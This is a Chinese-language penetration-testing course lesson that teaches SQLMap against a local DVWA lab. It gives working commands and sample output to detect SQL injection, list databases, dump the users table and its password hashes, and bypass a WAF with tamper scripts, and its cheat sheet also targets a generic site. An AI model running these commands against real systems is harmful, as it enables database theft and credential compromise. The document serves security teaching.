---
title: Day017：SQL 注入 - SQLMap 自动化
tags:
  - 网络安全
  - SQL注入
  - SQLMap
categories:
  - 90天安全突击
stage: 筑基
abbrlink: d017
date: 2026-02-08
updated: 2026-01-28
---

# Day017：SQL 注入 - SQLMap 自动化

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 筑基（第一阶段） |
| **所属周次** | Week 3：SQL 注入入门 |
| **今日主题** | 使用 SQLMap 自动化注入 |
| **预计时间** | 2 小时 |
| **难度等级** | 入门 |

---

## 今日痛点场景

> **场景**：你手工注入成功了，但过程很繁琐——判断列数、获取表名、获取列名、获取数据……每一步都要手动构造 payload。
>
> **问题**：有没有工具能自动完成这些重复工作？
>
> **今天的任务**：学会使用 SQLMap，一行命令搞定整个注入流程。

---

## 今日目标

- [ ] 安装并运行 SQLMap
- [ ] 检测 URL 是否存在 SQL 注入
- [ ] 自动获取数据库结构
- [ ] 自动导出表数据

**闯关条件**：使用 SQLMap 从 DVWA 导出 users 表的全部数据。

---

## 实战任务（先动手！）

### 任务 1：准备工作（10 分钟）

**确认 SQLMap 已安装**（Kali 自带）：
```bash
sqlmap --version
```

**获取 DVWA 的 Cookie**：

1. 登录 DVWA
2. 浏览器按 F12，打开开发者工具
3. 切换到 Network 或 Application 标签
4. 找到 Cookie 值（如 `PHPSESSID=xxx; security=low`）

**获取目标 URL**：

1. 进入 SQL Injection 页面
2. 输入 `1`，点击 Submit
3. 复制 URL（如 `http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit`）

---

### 任务 2：基础扫描（15 分钟）

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=你的值; security=low"
```

SQLMap 会自动：
- 检测注入点
- 判断数据库类型
- 测试各种注入技术

**输出示例**：
```
[*] starting @ 10:00:00

GET parameter 'id' is vulnerable. Do you want to keep testing? [y/N]
...
sqlmap identified the following injection point(s):
Parameter: id (GET)
    Type: boolean-based blind
    Type: error-based
    Type: time-based blind
    Type: UNION query
```

---

### 任务 3：获取数据库信息（15 分钟）

**获取所有数据库**：
```bash
sqlmap -u "URL" --cookie="COOKIE" --dbs
```

输出：
```
available databases:
[*] dvwa
[*] information_schema
```

**获取当前数据库**：
```bash
sqlmap -u "URL" --cookie="COOKIE" --current-db
```

---

### 任务 4：获取表和列（15 分钟）

**获取 dvwa 库的所有表**：
```bash
sqlmap -u "URL" --cookie="COOKIE" -D dvwa --tables
```

输出：
```
Database: dvwa
[2 tables]
+------------+
| guestbook  |
| users      |
+------------+
```

**获取 users 表的所有列**：
```bash
sqlmap -u "URL" --cookie="COOKIE" -D dvwa -T users --columns
```

输出：
```
Table: users
[8 columns]
+------------+-------------+
| Column     | Type        |
+------------+-------------+
| user       | varchar(15) |
| password   | varchar(32) |
| ...        | ...         |
+------------+-------------+
```

---

### 任务 5：导出数据（15 分钟）

**导出指定列**：
```bash
sqlmap -u "URL" --cookie="COOKIE" -D dvwa -T users -C user,password --dump
```

输出：
```
+----------+----------------------------------+
| user     | password                         |
+----------+----------------------------------+
| admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb  | e99a18c428cb38d5f260853678922e03 |
| 1337     | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo    | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy   | 5f4dcc3b5aa765d61d8327deb882cf99 |
+----------+----------------------------------+
```

**SQLMap 会自动尝试破解 MD5 哈希！**

---

### 任务 6：一键完成（可选）

懒人专用命令，自动完成所有步骤：
```bash
sqlmap -u "URL" --cookie="COOKIE" --batch --dump-all
```

`--batch`：使用默认选项，不需要交互确认。

---

## 今日闯关检查

| 检查项 | 状态 |
|--------|------|
| SQLMap 成功检测到注入点 | |
| 获取到数据库列表 | |
| 获取到 users 表结构 | |
| 成功导出 user 和 password 数据 | |

---

## 底层补课

### SQLMap 是什么？

**定义**：SQLMap 是一款开源的自动化 SQL 注入检测和利用工具。

**支持的数据库**：MySQL、Oracle、PostgreSQL、SQL Server、SQLite 等。

**支持的注入类型**：
- Boolean-based blind（布尔盲注）
- Time-based blind（时间盲注）
- Error-based（报错注入）
- UNION query-based（联合查询注入）
- Stacked queries（堆叠查询）

### SQLMap 常用参数

| 参数 | 作用 |
|------|------|
| `-u URL` | 指定目标 URL |
| `--cookie` | 设置 Cookie |
| `--data` | POST 数据 |
| `--dbs` | 列出所有数据库 |
| `-D` | 指定数据库 |
| `--tables` | 列出所有表 |
| `-T` | 指定表 |
| `--columns` | 列出所有列 |
| `-C` | 指定列 |
| `--dump` | 导出数据 |
| `--batch` | 非交互模式 |
| `--level` | 测试等级（1-5） |
| `--risk` | 风险等级（1-3） |

### SQLMap 工作流程

```
检测注入点 → 确定数据库类型 → 选择注入技术 → 提取数据
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 未登录 | 返回登录页面 | 加 `--cookie` 参数 |
| 检测不到 | No SQL injection found | 提高 `--level` 和 `--risk` |
| 太慢 | 半天不出结果 | 可能是盲注，耐心等待或用 `--technique=E` 指定报错注入 |
| 被拦截 | WAF 拦截 | 尝试 `--tamper` 绕过脚本 |

---

## 知识卡片速查

### SQLMap 常用命令组合

```bash
# 基础检测
sqlmap -u "http://target.com/page?id=1"

# 带 Cookie
sqlmap -u "URL" --cookie="COOKIE"

# POST 请求
sqlmap -u "URL" --data="username=admin&password=123"

# 获取数据库
sqlmap -u "URL" --dbs

# 获取表
sqlmap -u "URL" -D dbname --tables

# 获取列
sqlmap -u "URL" -D dbname -T tablename --columns

# 导出数据
sqlmap -u "URL" -D dbname -T tablename --dump

# 一键全自动
sqlmap -u "URL" --batch --dump-all

# 高级检测
sqlmap -u "URL" --level=5 --risk=3

# 绕过 WAF
sqlmap -u "URL" --tamper=space2comment
```

### 常用 Tamper 脚本

| 脚本 | 作用 |
|------|------|
| `space2comment` | 空格转注释 |
| `randomcase` | 随机大小写 |
| `between` | 用 BETWEEN 替换 > |
| `charencode` | URL 编码 |

---

## 常见问题

**Q1：SQLMap 检测不到注入怎么办？**

A1：
1. 确认目标确实有注入（手工测试）
2. 提高检测等级：`--level=5 --risk=3`
3. 指定注入点：`-p id`
4. 指定数据库类型：`--dbms=mysql`

**Q2：为什么我的扫描这么慢？**

A2：可能在尝试盲注。盲注需要一位一位猜测数据，非常耗时。可以用 `--technique=E`（只用报错注入）或 `--technique=U`（只用 UNION 注入）加速。

**Q3：SQLMap 能破解密码吗？**

A3：SQLMap 内置了哈希破解功能，会尝试用字典破解常见哈希（MD5、SHA1 等）。也可以把哈希导出后用专门的破解工具（如 Hashcat）。

---

## 明日预告

**Day 018：SQL 注入 - 盲注原理与实战**

明天你将：
- 理解什么是盲注
- 学习布尔盲注技术
- 学习时间盲注技术

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 今日收获 | |

---

> **导师点评**：
>
> 今天你学会了用 SQLMap——这是渗透测试必备神器。
>
> 一行命令就能完成昨天手工做的所有事情。
>
> 但记住：**工具用得再熟，也要知道原理**。
>
> 面试官问"SQLMap 是怎么检测注入的"，你得能说出布尔盲注、时间盲注、报错注入的区别。
>
> 明天我们深入盲注——当页面没有回显时，怎么"偷"数据。

```bash
echo "Day 017 Complete! SQLMap 真香！"
```
